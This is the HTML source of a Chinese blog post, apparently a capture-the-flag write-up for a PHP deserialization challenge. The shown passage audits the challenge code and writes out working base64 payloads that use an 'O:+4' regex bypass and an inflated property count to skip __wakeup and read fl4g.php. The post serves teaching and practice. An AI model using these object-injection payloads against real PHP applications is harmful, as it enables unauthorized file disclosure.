@@ -1,0 +1,706 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Noto Sans SC:300,300italic,400,400italic,700,700italic|consolas' , 'Noto Sans SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://moreant.github.io').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":"default","style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: true,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="0x00 - 题目描述地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;answer?type&#x3D;web&amp;number&#x3D;3&amp;grade&#x3D;1&amp;id&#x3D;5409&amp;page&#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界 WEB Web_php_unserialize">
+<meta property="og:url" content="http://moreant.github.io/post/60542.html">
+<meta property="og:site_name" content="莫居尘">
+<meta property="og:description" content="0x00 - 题目描述地址：https:&#x2F;&#x2F;adworld.xctf.org.cn&#x2F;task&#x2F;answer?type&#x3D;web&amp;number&#x3D;3&amp;grade&#x3D;1&amp;id&#x3D;5409&amp;page&#x3D;1 PHP 反序列，老题新做了。  打开 index.php 是这样的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://markdown.yeek.top/20200211215026.png">
+<meta property="og:image" content="http://markdown.yeek.top/20200211215256.png">
+<meta property="og:image" content="http://markdown.yeek.top/20200211233941.png">
+<meta property="og:image" content="http://markdown.yeek.top/20200212001625.png">
+<meta property="og:image" content="c:%5CUsers%5Cmojuchen%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581437878758.png">
+<meta property="og:image" content="http://markdown.yeek.top/20200212003517.png">
+<meta property="og:image" content="http://markdown.yeek.top/20200212004354.png">
+<meta property="og:image" content="http://markdown.yeek.top/20200212005224.png">
+<meta property="og:image" content="http://markdown.yeek.top/20200212005244.png">
+<meta property="article:published_time" content="2020-02-11T13:51:36.000Z">
+<meta property="article:modified_time" content="2020-02-11T16:59:25.299Z">
+<meta property="article:author" content="莫居尘 Moreant">
+<meta property="article:tag" content="信息安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://markdown.yeek.top/20200211215026.png">
+
+<link rel="canonical" href="http://moreant.github.io/post/60542.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>攻防世界 WEB Web_php_unserialize | 莫居尘</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">莫居尘</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">学习即输入输出</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">22</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">6</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">26</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://moreant.github.io/post/60542.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="http://markdown.yeek.top/bolg/20191029/b8Ytj5Mons6f.jpg?imageslim">
+      <meta itemprop="name" content="莫居尘 Moreant">
+      <meta itemprop="description" content="别教了，我学不动了">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="莫居尘">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界 WEB Web_php_unserialize
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-11 21:51:36" itemprop="dateCreated datePublished" datetime="2020-02-11T21:51:36+08:00">2020-02-11</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-12 00:59:25" itemprop="dateModified" datetime="2020-02-12T00:59:25+08:00">2020-02-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h2><p>地址：<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a></p>
+<p>PHP 反序列，老题新做了。</p>
+<p><img src="http://markdown.yeek.top/20200211215026.png" alt=""></p>
+<p>打开 <code>index.php</code> 是这样的</p>
+<p><img src="http://markdown.yeek.top/20200211215256.png" alt=""></p>
+<a id="more"></a>
+
+
+
+<h2 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 - 解题过程"></a>0x01 - 解题过程</h2><p>先审计一下代码，执行过程是从 17 行开始。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    $var = base64_decode($_GET[<span class="string">'var'</span>]); </span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>首先得用 GET 传入 var ，不然的话就高亮 index.php 文件源码 （25行） </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'var'</span>])) &#123; </span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="comment">// 高亮 index.php 的源码，效果就是题目描述的截图</span></span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着对传入的 var 变量进行 base64 解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$var = base64_decode($_GET[<span class="string">'var'</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>解码后进行 <code>正则匹配</code> ，匹配到的话直接结束（<code>die</code>）并显示 <strong>stop hacking!</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/[oc]:\d+:/i'</span>, $var)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @unserialize($var); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果没匹配到就<strong>反序列化</strong> (后面再解释啥是 <code>序列化</code> 和 <code>反序列化</code>)。</p>
+<p>Q: 反序列化啥呢？</p>
+<p>A: 明显是要反序列化 2-16 的 <code>Demo</code> 对象</p>
+<br>
+
+<p>首先如果<strong>构造Demo类</strong>，会</p>
+<ol>
+<li>执行 <code>__construct</code> 方法，将传入的 <code>$file</code> 赋值给本地的<strong>私有</strong>方法 $file。请给私有画上重点，后面个<strong>巨坑</strong>跟这个私有有关系。</li>
+<li>销毁时执行 <code>__destruct</code> 方法，高亮本地变量 <code>file</code> 文件的代码</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Q: 那 <code>__wakeup</code> 是干吗用的？</p>
+<p>A: 是当 <strong>反序列化构造这个类</strong> 时执行，将本地变量 <code>file</code> 重新设置为 file</p>
+<br>
+
+<p>还有个注释，明示了 flag 在 fl4g.php 文件</p>
+<h3 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h3><ul>
+<li>在php中，序列化用与存储或传递php的值的过程，同时不丢失其结构和数据类型。</li>
+<li>若被反序列化的变量是一个对象，在成功重新构造对象之后，PHP会自动地试图去调用<code>__wakeup()</code>魔术方法（如果存在的话）</li>
+</ul>
+<p>例子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $name;</span><br><span class="line">	<span class="keyword">private</span> $male;</span><br><span class="line">	<span class="keyword">protected</span> $money = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data, $male)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;data = $data;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;male = $male;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$number = <span class="number">66</span>;</span><br><span class="line">$str = <span class="string">'jerry'</span>;</span><br><span class="line">$bool = <span class="keyword">true</span>;</span><br><span class="line">$null = <span class="keyword">NULL</span>;</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'a'</span> =&gt; <span class="number">1</span>, <span class="string">'b'</span> =&gt; <span class="number">2</span>);</span><br><span class="line">$user = <span class="keyword">new</span> User(<span class="string">'tom'</span>, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($number));</span><br><span class="line">var_dump(serialize($str));</span><br><span class="line">var_dump(serialize($bool));</span><br><span class="line">var_dump(serialize($null));</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">var_dump(serialize($user));</span><br></pre></td></tr></table></figure>
+
+
+
+<p>输出结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">5</span>) <span class="string">"i:66;"</span> </span><br><span class="line">string(<span class="number">12</span>) <span class="string">"s:5:"</span>jerry<span class="string">";"</span> </span><br><span class="line">string(<span class="number">4</span>) <span class="string">"b:1;"</span> </span><br><span class="line">string(<span class="number">2</span>) <span class="string">"N;"</span> </span><br><span class="line">string(<span class="number">30</span>) <span class="string">"a:2:&#123;s:1:"</span>a<span class="string">";i:1;s:1:"</span><span class="string">b";i:2;&#125;"</span> </span><br><span class="line">string(<span class="number">93</span>) <span class="string">"O:4:"</span>User<span class="string">":4:&#123;s:4:"</span>name<span class="string">";N;s:10:"</span>Usermale<span class="string">";b:1;s:8:"</span>*money<span class="string">";i:1000;s:4:"</span>data<span class="string">";s:3:"</span>tom<span class="string">";&#125;"</span></span><br></pre></td></tr></table></figure>
+
+<p> 更多关于序列化的资料请参考</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/qq_35958788/article/details/82975885" target="_blank" rel="noopener">php 序列化与反序列化</a></p>
+</blockquote>
+<h3 id="获取-flag"><a href="#获取-flag" class="headerlink" title="获取 flag"></a>获取 flag</h3><h4 id="构造-序列化"><a href="#构造-序列化" class="headerlink" title="构造 序列化"></a>构造 序列化</h4><p>根据注释的明示直接访问 fl4g.php ，果然是一片空白。</p>
+<p>不过证明的确实有这个文件，并且 flag 就存在这个文件的代码中，需要我们使用 <code>highlight_file</code> 方法来显示出来。</p>
+<p><img src="http://markdown.yeek.top/20200211233941.png" alt=""></p>
+<p>构造 <code>Demo</code> 类，传入 <code>$file = fl4g.php</code> ，然后反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $file = <span class="string">'index.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = $file; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file, <span class="keyword">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">'fl4g.php'</span>;</span><br><span class="line">$demo = <span class="keyword">new</span> Demo($file);</span><br><span class="line">$s = serialize($demo);</span><br><span class="line">print_r($s);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">print_r(base64_encode($s));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可以使用 在线php 方便的调试 php 代码</p>
+<p><a href="http://www.dooccn.com/php/" target="_blank" rel="noopener">http://www.dooccn.com/php/</a></p>
+</blockquote>
+<p>得到结果序列化结果：</p>
+<p><code>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code></p>
+<p>base64 编码后：</p>
+<p><code>Tzo0OiJEZW1vIjoxOntzOjEwOiIARGVtbwBmaWxlIjtzOjg6ImZsNGcucGhwIjt9</code></p>
+<h4 id="绕过正则匹配"><a href="#绕过正则匹配" class="headerlink" title="绕过正则匹配"></a>绕过正则匹配</h4><p>直接传进去，果然被匹配到了</p>
+<p><img src="http://markdown.yeek.top/20200212001625.png" alt=""></p>
+<p>不清楚正则匹配的话，在这个网站上(<a href="https://www.regextester.com/" target="_blank" rel="noopener">regextester</a>)可以知道匹配到的部分是前面的 <code>O:4:</code></p>
+<p><img src="C:%5CUsers%5Cmojuchen%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1581437878758.png" alt="1581437878758"></p>
+<p>可以在 <code>4</code> 前面加上 <code>+</code> 来绕过，因为在 php 语法中，<code>+4</code> = <code>4</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"><span class="keyword">print</span>(<span class="number">-4</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用漏洞，绕过-wakeup"><a href="#利用漏洞，绕过-wakeup" class="headerlink" title="利用漏洞，绕过 __wakeup"></a>利用漏洞，绕过 __wakeup</h4><p>传入绕过正则匹配并编码后的载荷：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var?&#x3D;TzorNDoiRGVtbyI6MTp7czoxMDoiRGVtbyAgZmlsZSI7czo4OiJmbDRnLnBocCI7fQ</span><br></pre></td></tr></table></figure>
+
+<p>果不其然的显示回 index.php 的源码了。</p>
+<p><img src="http://markdown.yeek.top/20200212003517.png" alt=""></p>
+<p>这是因为 <strong>反序列化 Demo 对象</strong>后调用了 <code>__wakeup</code> 方法，重新将传入的 <code>fl4g.php</code> 设置为 <code>index.php</code> 了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'index.php'</span>) &#123; </span><br><span class="line">        <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'index.php'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这个时候就要提到著名的反序列化漏洞了。</p>
+<p>在之前，<code>O:4:&quot;Demo&quot;:1:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code> 中的 <code>:1:</code> 是代表这个对象中有一个属性，上面的 <a href="#序列化和反序列化">序列化和反序列化</a> 的最后一个例子也是同理，只不过在<strong>构造方法</strong>中多了一个 <code>data</code> 属性，所以是 <code>4</code> 。</p>
+<br>
+
+<p><code>__wakeup</code> 漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过 <code>__wakeup</code> 的执行。</p>
+<p>因此最后的序列化是：</p>
+<p><code>O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code></p>
+<p>编码后：</p>
+<p><code>TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30=</code></p>
+<p>载荷是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var?&#x3D;TzorNDoiRGVtbyI6Mjp7czoxMDoiRGVtb2ZpbGUiO3M6ODoiZmw0Zy5waHAiO30&#x3D;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="巨坑-私有属性"><a href="#巨坑-私有属性" class="headerlink" title="巨坑-私有属性"></a>巨坑-私有属性</h4><p>结果居然还是 <code>index.php</code> 的源码！！！</p>
+<p><strong>WTF ???</strong></p>
+<p>经过多方百度后，发现了一个<strong>盲点</strong>——由于 <code>Demo</code> 类的 <code>file</code> 属性是<strong>私有属性</strong>序列化之后，在类名前后会有 %00 阻断。</p>
+<p>图形化就是这样：</p>
+<p><code>%44%65%6d%6f</code>进行 hex 转化后 就是 <code>Demo</code> ，可以在这个网站上测试 <a href="https://www.107000.com/T-Hex/" target="_blank" rel="noopener">Hex编码/解码</a></p>
+<p><img src="http://markdown.yeek.top/20200212004354.png" alt=""></p>
+<p><strong>坑来了：</strong></p>
+<p>如果直接复制文本样式，在别的地方进行<strong>base64编码</strong>会丢失掉 <code>%00</code> 的信息！！然后再 base64解码-&gt;反序列化 自然不可能是 <code>O:+4:&quot;Demo&quot;:2:{s:10:&quot;Demofile&quot;;s:8:&quot;fl4g.php&quot;;}</code> 序列化的后的结果！</p>
+<br>
+
+<p>Q: 那咋办呢？</p>
+<p>A: 在 php 中就把<strong>替换</strong>和<strong>base64编码</strong>弄好！</p>
+<p>执行以下代码：</p>
